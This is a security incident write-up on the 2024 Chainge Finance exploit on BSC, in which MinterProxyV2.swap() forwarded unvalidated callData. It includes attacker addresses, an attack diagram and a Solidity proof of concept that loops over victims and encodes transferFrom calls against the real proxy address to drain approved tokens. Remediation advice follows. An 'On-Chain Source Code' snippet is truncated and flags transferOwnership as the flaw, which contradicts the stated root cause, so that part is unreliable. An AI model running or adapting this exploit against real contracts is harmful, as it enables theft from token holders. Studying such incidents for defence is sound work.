# Chainge Finance — Arbitrary calldata in swap() Used to Steal Victim Tokens

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | Chainge Finance |
| **Chain** | BSC |
| **Loss** | ~$200,000 |
| **Attacker 1** | [0x6eec0f4c](https://bscscan.com/address/0x6eec0f4c017afe3dfadf32b51339c37e9fd59dfb) |
| **Attacker 2** | [0xacdbe7b7](https://bscscan.com/address/0xacdbe7b770a14ca3bc34865ac3986c0ce771fd68) |
| **Attack Contract 1** | [0x791c6542](https://bscscan.com/address/0x791c6542bc52efe4f20df0ee672b88579ae3fd9a) |
| **Attack Contract 2** | [0x52b19de3](https://bscscan.com/address/0x52b19de39476823d33ab4b1edbec91e29dadba38) |
| **Vulnerable Contract** | [MinterProxyV2 0x80a0d7a6](https://bscscan.com/address/0x80a0d7a6fd2a22982ce282933b384568e5c852bf) |
| **Affected Tokens** | USDT, SOL, AVAX, BabyDoge, FOLKI, ATOM, TLOS, IOTX, LINCH, LINK, BTCB, ETH |
| **Root Cause** | `MinterProxyV2.swap()` executes arbitrary `callData` without validation, allowing unauthorized `transferFrom()` of tokens pre-approved by victims |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/ChaingeFinance_exp.sol) |

---

## 1. Vulnerability Overview

Chainge Finance's `MinterProxyV2.swap()` function delegates externally-supplied `callData` to a token contract without any validation. The attacker passed `transferFrom(victim, attacker, balance)` encoded data as `callData`, consuming the allowance victims had granted to MinterProxyV2 and draining 12 different tokens.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: swap() executes arbitrary callData
contract MinterProxyV2 {
    function swap(
        address token,
        uint256 amount,
        bytes calldata callData  // ← no validation
    ) external {
        // callData is forwarded directly to the token contract
        (bool success,) = token.call(callData);
        require(success, "swap failed");
    }
}

// Attacker's callData construction:
// abi.encodeWithSelector(
//   IERC20.transferFrom.selector,
//   victim,      // from: victim
//   attacker,    // to: attacker
//   victimBalance // amount: full balance
// )

// ✅ Safe code: callData selector whitelist validation
function swap(address token, uint256 amount, bytes calldata callData) external {
    // Only allowed function selectors can be executed
    bytes4 selector = bytes4(callData[:4]);
    require(allowedSelectors[selector], "selector not allowed");
    // Block transferFrom and transfer selectors
    require(selector != IERC20.transferFrom.selector, "transferFrom not allowed");
    (bool success,) = token.call(callData);
    require(success);
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: ChaingeFinance_decompiled.sol
contract ChaingeFinance {
    function transferOwnership(address p0) external {}  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Collect list of victims (addresses that granted allowance to MinterProxyV2)
  │
  ├─→ [2] For each token/victim combination:
  │         ├─ Query victim.balanceOf()
  │         └─ Query victim.allowance(victim, MinterProxyV2)
  │
  ├─→ [3] Call MinterProxyV2.swap(token, 0, transferFromCalldata)
  │         └─ callData = abi.encode(transferFrom, victim, attacker, amount)
  │         └─ token.call(callData) → executes IERC20.transferFrom()
  │         └─ Victim tokens → transferred to attacker
  │
  ├─→ [4] Repeat collection across 12 tokens
  │
  └─→ [5] ~$200K drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IMinterProxyV2 {
    function swap(address token, uint256 amount, bytes calldata callData) external;
}

contract AttackContract {
    IMinterProxyV2 constant proxy = IMinterProxyV2(0x80a0d7a6fd2a22982ce282933b384568e5c852bf);

    address[] tokens = [
        0x55d398326f99059fF775485246999027B3197955, // USDT
        // SOL, AVAX, BabyDoge, FOLKI, ATOM, TLOS, IOTX, LINCH, LINK, BTCB, ETH ...
    ];

    function testExploit(address[] calldata victims) external {
        for (uint t = 0; t < tokens.length; t++) {
            IERC20 token = IERC20(tokens[t]);
            for (uint v = 0; v < victims.length; v++) {
                address victim = victims[v];
                uint256 allowed = token.allowance(victim, address(proxy));
                uint256 bal     = token.balanceOf(victim);
                uint256 amount  = allowed < bal ? allowed : bal;
                if (amount == 0) continue;

                // [1] Construct transferFrom calldata
                bytes memory callData = abi.encodeWithSelector(
                    IERC20.transferFrom.selector,
                    victim,          // from: victim
                    address(this),   // to: attacker
                    amount           // amount: full approved amount
                );

                // [2] Execute arbitrary callData via swap()
                proxy.swap(address(token), 0, callData);
            }
        }
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Arbitrary External Call |
| **CWE** | CWE-20: Improper Input Validation |
| **Attack Vector** | External (swap() callData forgery) |
| **DApp Category** | Cross-chain Swap Proxy |
| **Impact** | Full drain of victim-approved tokens (~$200K) |

## 6. Remediation Recommendations

1. **callData Selector Whitelist**: Block dangerous selectors such as `transferFrom` and `transfer`
2. **Token Whitelist**: Restrict calls to an approved list of token contracts only
3. **msg.sender Validation**: Ensure the beneficiary of `swap()` is always `msg.sender`
4. **Reference Seneca Pattern**: Apply the same fix approach used for the identical `performOperations` vulnerability

## 7. Lessons Learned

- The pattern of forwarding arbitrary `callData` to token contracts in a swap proxy is the same allowance-draining vector as Seneca (2024-02).
- As demonstrated by losses across 12 tokens, a general-purpose proxy enables simultaneous multi-token theft.
- Any allowance a user grants to a proxy contract remains a permanent risk as long as the proxy can execute arbitrary callData.